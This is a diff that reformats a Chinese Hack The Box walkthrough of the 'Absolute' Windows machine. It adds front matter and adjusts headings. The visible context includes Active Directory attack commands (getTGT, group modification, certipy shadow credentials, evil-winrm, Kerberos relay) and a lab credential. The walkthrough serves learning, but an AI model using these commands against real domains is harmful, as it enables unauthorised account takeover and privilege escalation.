@@ -1,5 +1,17 @@
+---
+title: Absolute
+weight: 498
+tags:
+  - windows
+  - insane
+  - asreproast
+  - shadow-credentials
+  - kerberos-relay
+---
+
 ![Absolute-流程图.png](Absolute-流程图.png)
-# 00. 摘要
+
+## 00. 摘要
 
 > 关键词：信息泄露、ASREProast、LDAP侦察、Shadow Credentials、Kerberos Relay
 
@@ -15,7 +27,7 @@
 8. 将 `m.lovegod` 账户添加到`Network Audit` 组，然后使用 `Shadow Credentials` 攻击拿下 `winrm_user` 账户
 9.  使用 Kerberos Relay 将 `winrm_user` 添加到`Administrators`组，获得管理员权限
 
-# 01. 信息收集
+## 01. 信息收集
 
 使用 `rustscan` 进行端口扫描，发现如下开放端口
 
@@ -62,7 +74,7 @@ Open 10.10.11.181:49712
 Open 10.10.11.181:49718
 ```
 
-# 02. 使用Guest账户枚举 SMB服务
+## 02. 使用Guest账户枚举 SMB服务
 
 在没有任何账户的情况下，尝试使用Windows内置的Guest账户枚举SMB文件共享
 
@@ -74,7 +86,7 @@ SMB         10.10.11.181    445    DC               [-] absolute.htb\Guest: STAT
 
 看到 `STATUS_ACCOUNT_DISABLED` 报错，表示 `Guest` 账户并没有启用。
 
-# 03. HTTP服务信息收集
+## 03. HTTP服务信息收集
 
 然后我们访问 `http://10.10.11.181/` 经过一番收集，没有发现有用的线索。后来看了官方提示之后，才发现要从网页的 jpg 图片中找线索。
 
@@ -286,14 +298,15 @@ C:\Users\Lamber>echo 10.10.11.181 dc.absolute.htb > C:\Windows\System32\drivers\
 username: m.lovegod
 password: AbsoluteLDAP2022!
 ```
-# 04. Bloodhound信息收集与分析
 
+## 04. Bloodhound信息收集与分析
 
 
 ![Absolute-bloodhound.png](Absolute-bloodhound.png)
+
 # 04. 从 m.lovegod 到 winrm_user
 
-## 01.  将 `m.lovegod` 添加到 `Network Audit` 组
+### 01.  将 `m.lovegod` 添加到 `Network Audit` 组
 
 ```bash
 kali@kali[~]$ impacket-getTGT 'absolute.htb'/'m.lovegod':'AbsoluteLDAP2022!' -dc-ip dc.absolute.htb
@@ -318,7 +331,7 @@ kali@kali[~]$ net rpc group members "Network Audit" -U 'absolute.htb'/'m.lovegod
 ```
 
 
-## 02. Shadow Credentials攻击拿到winrm_user
+### 02. Shadow Credentials攻击拿到winrm_user
 
 ```bash
 kali@kali[~]$ certipy-ad shadow auto -k -no-pass -u absolute.htb/m.lovegod@dc.absolute.htb -dc-ip 10.10.11.181 -target dc.absolute.htb -account winrm_user
@@ -365,7 +378,7 @@ kali@kali[~]$ evil-winrm -i dc.absolute.htb -r ABSOLUTE.HTB
 
 ```
 
-# 05. Kerberos Relay提权
+## 05. Kerberos Relay提权
 
 ```bash
 kali@kali[~]$ .\CheckPort.exe
@@ -383,7 +396,8 @@ kali@kali[~]$ .\runascs.exe winrm_user -d absolute.htb TotallyNotACorrectPasswor
 
 
 ---
-# 参考链接
+
+## 参考链接
 1. 文章：ASREPRoast攻击
    https://www.thehacker.recipes/ad/movement/kerberos/asreproast
 2. 文章：RID爆破
@@ -408,4 +422,3 @@ kali@kali[~]$ .\runascs.exe winrm_user -d absolute.htb TotallyNotACorrectPasswor
     https://github.com/cube0x0/KrbRelay
 12. 工具：RunasCs
     https://github.com/antonioCoco/RunasCs
-13. 工具：
